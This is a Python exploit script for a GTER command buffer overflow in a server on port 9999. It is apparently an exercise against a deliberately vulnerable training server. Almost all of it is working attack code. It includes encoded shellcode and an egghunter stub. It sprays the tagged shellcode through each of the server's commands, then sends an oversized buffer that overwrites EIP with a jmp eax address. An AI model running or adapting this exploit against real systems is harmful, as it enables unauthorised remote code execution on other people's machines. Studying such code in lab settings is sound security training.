#!/usr/bin/env python
#GTER EIP overflow
#Tested on Vista Enterprise SP2 32-bit and Windows 7 Professional SP1 32-bit

import socket
import time 

IPADDR = '192.168.10.136'
PORT = 9999
BUFFER = 1024

SHELLCODE = ("\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41"
"\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
"\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x39"
"\x6c\x4d\x38\x6b\x32\x45\x50\x53\x30\x45\x50\x61\x70"
"\x4e\x69\x5a\x45\x30\x31\x6b\x70\x62\x44\x4e\x6b\x50"
"\x50\x56\x50\x4e\x6b\x50\x52\x46\x6c\x4e\x6b\x33\x62"
"\x45\x44\x6c\x4b\x52\x52\x64\x68\x44\x4f\x6d\x67\x50"
"\x4a\x75\x76\x54\x71\x39\x6f\x4c\x6c\x57\x4c\x75\x31"
"\x53\x4c\x55\x52\x56\x4c\x47\x50\x59\x51\x78\x4f\x66"
"\x6d\x73\x31\x59\x57\x6b\x52\x48\x72\x66\x32\x72\x77"
"\x4e\x6b\x63\x62\x42\x30\x6c\x4b\x62\x6a\x55\x6c\x4e"
"\x6b\x30\x4c\x44\x51\x62\x58\x79\x73\x30\x48\x47\x71"
"\x58\x51\x76\x31\x6e\x6b\x53\x69\x57\x50\x43\x31\x5a"
"\x73\x6c\x4b\x33\x79\x54\x58\x6d\x33\x56\x5a\x53\x79"
"\x4c\x4b\x77\x44\x6e\x6b\x35\x51\x59\x46\x75\x61\x79"
"\x6f\x6e\x4c\x79\x51\x38\x4f\x34\x4d\x77\x71\x7a\x67"
"\x67\x48\x79\x70\x53\x45\x7a\x56\x57\x73\x53\x4d\x79"
"\x68\x57\x4b\x51\x6d\x57\x54\x51\x65\x4a\x44\x50\x58"
"\x4e\x6b\x62\x78\x66\x44\x53\x31\x6e\x33\x73\x56\x6e"
"\x6b\x74\x4c\x62\x6b\x4e\x6b\x72\x78\x65\x4c\x77\x71"
"\x4b\x63\x4c\x4b\x53\x34\x6c\x4b\x67\x71\x48\x50\x4f"
"\x79\x77\x34\x67\x54\x57\x54\x53\x6b\x73\x6b\x35\x31"
"\x62\x79\x51\x4a\x32\x71\x39\x6f\x69\x70\x61\x4f\x33"
"\x6f\x62\x7a\x6e\x6b\x62\x32\x78\x6b\x4c\x4d\x63\x6d"
"\x62\x48\x76\x53\x77\x42\x57\x70\x77\x70\x70\x68\x63"
"\x47\x62\x53\x30\x32\x71\x4f\x62\x74\x31\x78\x72\x6c"
"\x74\x37\x51\x36\x64\x47\x59\x6f\x6e\x35\x4d\x68\x4c"
"\x50\x63\x31\x63\x30\x35\x50\x51\x39\x4f\x34\x52\x74"
"\x52\x70\x50\x68\x66\x49\x6d\x50\x30\x6b\x47\x70\x79"
"\x6f\x7a\x75\x62\x70\x52\x70\x52\x70\x50\x50\x53\x70"
"\x46\x30\x57\x30\x52\x70\x72\x48\x6a\x4a\x74\x4f\x59"
"\x4f\x6d\x30\x6b\x4f\x78\x55\x4f\x67\x71\x7a\x75\x55"
"\x72\x48\x59\x50\x39\x38\x34\x4a\x6d\x53\x51\x78\x46"
"\x62\x57\x70\x47\x71\x6d\x6b\x4c\x49\x48\x66\x63\x5a"
"\x44\x50\x53\x66\x50\x57\x62\x48\x4f\x69\x4f\x55\x63"
"\x44\x55\x31\x79\x6f\x7a\x75\x6c\x45\x49\x50\x74\x34"
"\x76\x6c\x59\x6f\x42\x6e\x66\x68\x31\x65\x58\x6c\x53"
"\x58\x38\x70\x6d\x65\x4e\x42\x43\x66\x4b\x4f\x49\x45"
"\x75\x38\x53\x53\x30\x6d\x62\x44\x53\x30\x4f\x79\x78"
"\x63\x33\x67\x61\x47\x72\x77\x75\x61\x4c\x36\x70\x6a"
"\x74\x52\x56\x39\x66\x36\x68\x62\x69\x6d\x52\x46\x6a"
"\x67\x53\x74\x45\x74\x57\x4c\x47\x71\x63\x31\x4e\x6d"
"\x63\x74\x56\x44\x46\x70\x59\x56\x63\x30\x57\x34\x33"
"\x64\x72\x70\x43\x66\x63\x66\x51\x46\x52\x66\x73\x66"
"\x30\x4e\x51\x46\x73\x66\x42\x73\x72\x76\x70\x68\x44"
"\x39\x58\x4c\x57\x4f\x4f\x76\x59\x6f\x4a\x75\x6d\x59"
"\x79\x70\x52\x6e\x72\x76\x51\x56\x69\x6f\x34\x70\x50"
"\x68\x77\x78\x4e\x67\x47\x6d\x63\x50\x6b\x4f\x7a\x75"
"\x6d\x6b\x79\x6e\x54\x4e\x76\x52\x69\x7a\x50\x68\x4d"
"\x76\x4a\x35\x4f\x4d\x4f\x6d\x6b\x4f\x38\x55\x55\x6c"
"\x56\x66\x61\x6c\x45\x5a\x6b\x30\x4b\x4b\x69\x70\x73"
"\x45\x37\x75\x6f\x4b\x51\x57\x37\x63\x34\x32\x62\x4f"
"\x61\x7a\x35\x50\x61\x43\x4b\x4f\x59\x45\x41\x41")

#0x62501084 call eax
#0x625011b1 jmp eax
#0x625015b1 call eax

EGG = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
ECXALIGN = ("\x52\x59\x83\xc1\x30")

buffer = "GTER " + "A" * 8 + EGG + "A" * 111 + "\xb1\x15\x50\x62" + "B" * 4849 + "."

#Cycles through available commands in an attempt to store our shellcode prepended with our egghunter keyword.
for i in ["HELP ", "GDOG ", "HTER ", "LTER ", "KSTAN ", "TRUN ", "STATS ", "RTIME ", "LTIME ", "SRUN ", "GMON "]:
	print "Attempting to store shellcode in " + (i) 	
	con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	con.connect((IPADDR,PORT))
	time.sleep(1)
	SHELL = i + "T00WT00W" + ECXALIGN + "\x90" * 35 + SHELLCODE 
	con.send(SHELL)
	data = con.recv(BUFFER)
	con.close()
con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
con.connect((IPADDR,PORT))
time.sleep(2)
con.send(buffer)
data = con.recv(BUFFER)
print "Buffer sent!"
con.close()

